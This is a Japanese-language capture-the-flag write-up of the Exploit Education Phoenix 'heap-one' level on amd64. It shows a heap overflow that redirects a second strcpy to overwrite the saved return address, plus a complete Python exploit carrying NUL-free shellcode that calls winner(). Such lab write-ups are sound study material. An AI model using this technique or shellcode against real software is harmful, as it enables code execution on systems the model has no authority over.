# Phoenix heap-one write-up

対象:

- 接続: `ssh -F /dev/null -p 2223 user@localhost`
- パスワード: `user`
- バイナリ: `/home/user/heap/heap-one`
- 環境: amd64 Phoenix, setuid/setgid ELF, non-PIE, executable stack

## 参考資料

- 引用:url https://exploit.education/phoenix/heap-one/

公式ページでソースの構造を確認し、実際のアドレス、heap 配置、amd64 特有の NUL byte 問題は VM 内で `readelf`, `objdump`, `gdb` を使って確認した。

## 初学者向けの解き方

この問題で最初に立てる目的は、「どこに overflow があり、何を上書きすれば成功関数へ到達できるか」を調べること。heap 問題では、いきなり payload を作らず、まず次の 4 点を確認する。

1. 成功関数があるか
2. PIE/RELRO/NX などでアドレスや書き込み先が固定か
3. どの heap chunk からどの heap chunk へ溢れられるか
4. `strcpy` などの入力制約で NUL byte を扱えるか

最初に実行したのはバイナリの基本確認。

```sh
file /home/user/heap/heap-one
readelf -h /home/user/heap/heap-one | egrep 'Type|Entry'
readelf -s /home/user/heap/heap-one | egrep ' winner$| main$'
readelf -r /home/user/heap/heap-one | egrep 'puts|strcpy|JUMP'
readelf -W -l /home/user/heap/heap-one | egrep 'GNU_STACK|LOAD'
```

見るべき出力は次。

```text
Type: EXEC
winner: 0x400af3
puts@GOT: 0x6041d0
GNU_STACK ... RWE
```

`Type: EXEC` は PIE ではないという意味なので、`winner` や GOT のアドレスは毎回同じ。`winner` が見つかったので、最終的にはここを呼べばよい。`GNU_STACK RWE` は stack shellcode も使えるという保険になる。

次に `main` の動きを読む。目的は「どの入力がどこにコピーされるか」を知ること。

```sh
objdump -d -M intel /home/user/heap/heap-one | sed -n '/<main>:/,/^$/p'
```

重要な命令の読み方:

```asm
call malloc          ; 4 回呼ばれている
call strcpy@plt      ; 2 回呼ばれている
call puts@plt        ; 最後に puts が呼ばれる
```

逆アセンブルを C 風に直すと、次のように見える。

```c
i1 = malloc(0x10);
i1->name = malloc(0x8);
i2 = malloc(0x10);
i2->name = malloc(0x8);
strcpy(i1->name, argv[1]);
strcpy(i2->name, argv[2]);
puts("and that's a wrap folks!");
```

ここから分かる方針は、「1 回目の `strcpy` で `i2->name` pointer を壊せば、2 回目の `strcpy` が任意アドレス書き込みになる」ということ。

次に、何 byte 溢れさせれば `i2->name` に届くかを gdb で調べる。

```sh
gdb -q -batch \
  -ex 'b *0x400aa6' \
  -ex 'run AAA BBB' \
  -ex 'set $i1=*(void**)($rbp-8)' \
  -ex 'set $i2=*(void**)($rbp-0x10)' \
  -ex 'p/x $i1' \
  -ex 'p/x $i2' \
  -ex 'p/x *(void**)($i1+8)' \
  -ex 'p/x *(void**)($i2+8)' \
  /home/user/heap/heap-one
```

出力の意味:

```text
i1       = 0x7ffff7ef6010
i1->name = 0x7ffff7ef6030
i2       = 0x7ffff7ef6050
i2->name = 0x7ffff7ef6070
```

書き換えたいのは `i2->name` field で、これは `i2 + 0x8 = 0x7ffff7ef6058`。overflow の開始点は `i1->name = 0x7ffff7ef6030`。したがって:

```text
0x7ffff7ef6058 - 0x7ffff7ef6030 = 0x28
```

つまり `argv[1]` は 40 byte padding の後に「2 回目の `strcpy` の書き込み先」を置く。

最初に考える自然な攻撃は `puts@GOT` を `winner` にすること。理由は、最後に `puts()` が呼ばれるので、`puts@GOT` の中身を `winner` に変えれば `puts()` のつもりで `winner()` が呼ばれるから。

しかし amd64 の argv には NUL byte を入れられない。実際に Python で確認する。

```sh
python3 - <<'PY'
import struct
print(struct.pack('<Q', 0x6041d0))
print(struct.pack('<Q', 0x400af3))
PY
```

出力:

```text
b'\xd0A`\x00\x00\x00\x00\x00'
b'\xf3\n@\x00\x00\x00\x00\x00'
```

どちらも途中に `\x00` がある。`strcpy` は `\x00` でコピーを止めるので、GOT overwrite はこの環境では素直に通らない。ここで「GOT ではなく stack の return address を書く」方針に切り替えた。

stack address を使うため、環境変数で stack layout が変わらないように `env -i` で空環境にして測る。

```sh
env -i /usr/local/bin/gdb -q -batch \
  -ex 'set exec-wrapper env -i' \
  -ex 'b *0x400aa6' \
  -ex 'run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBB' \
  -ex 'p/x $rbp+8' \
  -ex 'x/s *(*(void***)($rbp-0x20)+1)' \
  /home/user/heap/heap-one
```

ここで見たいのは 2 つだけ。

```text
saved RIP address = 0x7fffffffedc8
argv[1] address   = 0x7fffffffefa9
```

最終 payload の意味はこうなる。

```text
argv[1]:
  40 bytes で i2->name field まで進む
  そこに saved RIP address の下位 6 byte を書く

argv[2]:
  saved RIP に argv[1] address の下位 6 byte を書く

argv[1] の先頭:
  NOP + shellcode
```

`os.execve(path, argv, {})` で環境を空にして実行するのは、gdb で測った stack address と実行時の stack address を合わせるため。

## 観察

`heap-one` は strip されておらず、`winner` シンボルが残っている。

```text
winner:    0x400af3
main:      0x400a3d
puts@GOT:  0x6041d0
```

`main` の流れは以下。

```c
i1 = malloc(0x10);
i1->name = malloc(0x8);
i2 = malloc(0x10);
i2->name = malloc(0x8);
strcpy(i1->name, argv[1]);
strcpy(i2->name, argv[2]);
puts("and that's a wrap folks!");
```

gdb で allocation 後、1 回目の `strcpy` 直前を見ると次の配置だった。

```text
i1       = 0x7ffff7ef6010
i1->name = 0x7ffff7ef6030
i2       = 0x7ffff7ef6050
i2->name = 0x7ffff7ef6070
```

したがって、`i1->name` から `i2->name` までのオフセットは `0x28` bytes。

```text
0x7ffff7ef6058 - 0x7ffff7ef6030 = 0x28
```

## 探索ログ

最初にファイル種別とシンボルを確認した。

```sh
file /home/user/heap/heap-one
readelf -h /home/user/heap/heap-one | egrep 'Type|Entry'
readelf -s /home/user/heap/heap-one | egrep ' winner$| main$'
readelf -r /home/user/heap/heap-one | egrep 'puts|strcpy|JUMP'
readelf -W -l /home/user/heap/heap-one | egrep 'GNU_STACK|LOAD'
```

確認できたこと:

- `Type: EXEC` なので PIE ではなく、`winner` や GOT のアドレスは固定
- `winner = 0x400af3`
- `puts@GOT = 0x6041d0`
- `GNU_STACK ... RWE` なので stack 上の shellcode 実行も候補にできる

次に `objdump` で `main` を読んだ。

```sh
objdump -d -M intel /home/user/heap/heap-one | sed -n '/<main>:/,/^$/p'
```

`malloc(0x10)`, `malloc(0x8)`, `malloc(0x10)`, `malloc(0x8)` の順で 4 chunk が作られ、1 回目の `strcpy` は `i1->name`、2 回目の `strcpy` は `i2->name` を宛先にしていた。つまり 1 回目の overflow で `i2->name` pointer を書き換えれば、2 回目の `strcpy` が任意アドレスへの write になる。

実際の heap 間隔は gdb で確認した。

```sh
gdb -q -batch \
  -ex 'b *0x400aa6' \
  -ex 'run AAA BBB' \
  -ex 'set $i1=*(void**)($rbp-8)' \
  -ex 'set $i2=*(void**)($rbp-0x10)' \
  -ex 'p/x $i1' \
  -ex 'p/x $i2' \
  -ex 'p/x *(void**)($i1+8)' \
  -ex 'p/x *(void**)($i2+8)' \
  /home/user/heap/heap-one
```

この結果から、`i1->name` 先頭から `i2->name` field までが `0x28` byte と分かった。

## 失敗しやすい方針

i386 版なら `i2->name` を `puts@GOT` にして、次の `strcpy` で `winner` を書くのが素直。

amd64 版でも一見同じことをしたくなるが、argv には NUL byte を含められない。

```text
puts@GOT = 0x00000000006041d0 -> d0 41 60 00 ...
winner   = 0x0000000000400af3 -> f3 0a 40 00 ...
```

`strcpy` は最初の NUL で止まるため、GOT や `winner` の 64-bit address をそのまま argv 経由で完全には書けない。

この段階で GOT overwrite は一旦捨てた。`puts@GOT` も `winner` も下位 3 byte だけなら渡せるが、`strcpy` の終端 NUL が途中に入るため、既存の 8 byte pointer 全体を正しく目的値にできない。

そこで別の書き込み先として stack の saved RIP を検討した。`i2->name` を saved RIP に向け、2 回目の `strcpy` で戻り先を argv 上の shellcode にする方針なら、必要な pointer は stack address の下位 6 byte で済む。

## 解法

heap overflow で `i2->name` を stack 上の saved RIP に向ける。2 回目の `strcpy` で saved RIP に argv 上の shellcode address を書く。

stack は executable:

```text
GNU_STACK ... RWE
```

`env -i` で環境変数を空にして stack layout を固定し、payload と同じ長さの引数で gdb を使った。

```sh
env -i /usr/local/bin/gdb -q -batch \
  -ex 'set exec-wrapper env -i' \
  -ex 'b *0x400aa6' \
  -ex 'run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBB' \
  -ex 'p/x $rbp+8' \
  -ex 'x/s *(*(void***)($rbp-0x20)+1)' \
  /home/user/heap/heap-one
```

得られた値:

```text
saved RIP address = 0x7fffffffedc8
argv[1] address   = 0x7fffffffefa9
```

ここで `env -i` を使った理由は、環境変数の数や長さで argv の stack address がずれるため。実行時にも `os.execve(path, argv, {})` として環境を空にし、gdb で測った layout と一致させた。

payload の形:

```text
argv[1] = [NOP/shellcode padding total 40 bytes] + saved RIP address first 6 bytes
argv[2] = argv[1] address first 6 bytes
```

1 回目の `strcpy` の結果、`i2->name` が saved RIP を指す。2 回目の `strcpy` は `argv[2]` を saved RIP にコピーするので、`main` の `ret` で `argv[1]` 上の shellcode へ飛ぶ。

shellcode は NUL-free で、`winner()` を呼んでから `exit(0)` する。

```asm
xor rax, rax
mov al, 0x40
shl rax, 0x10
mov ax, 0x0af3
call rax
xor edi, edi
xor rax, rax
mov al, 0x3c
syscall
```

## 最終 exploit

SSH 先で実行する。

```python
import os
import struct

path = b"/home/user/heap/heap-one"
saved_rip = 0x7fffffffedc8
argv1_addr = 0x7fffffffefa9

shellcode = (
    b"\x48\x31\xc0\xb0\x40\x48\xc1\xe0\x10\x66\xb8\xf3\x0a\xff\xd0"
    b"\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05"
)

arg1 = b"\x90" * (40 - len(shellcode))
arg1 += shellcode
arg1 += struct.pack("<Q", saved_rip)[:6]

arg2 = struct.pack("<Q", argv1_addr)[:6]

assert len(arg1) == 46
assert len(arg2) == 6
assert b"\x00" not in arg1
assert b"\x00" not in arg2

os.execve(path, [path, arg1, arg2], {})
```

成功時の出力:

```text
and that's a wrap folks!
Congratulations, you've completed this level @ 1777999535 seconds past the Epoch
```

## 試行錯誤の要点

最初は `puts@GOT -> winner` の典型解法を考えた。しかし amd64 の argv では NUL byte を含められず、`0x0000000000400af3` や `0x00000000006041d0` を完全に渡せなかった。

次に executable stack を確認し、saved RIP overwrite に切り替えた。この方針では stack address の上位 2 byte が既に 0 で、下位 6 byte だけを `strcpy` で書けば目的の pointer になる。最終 exploit では `assert b"\x00" not in ...` を入れて、argv に渡す byte 列が NUL-free であることを確認した。
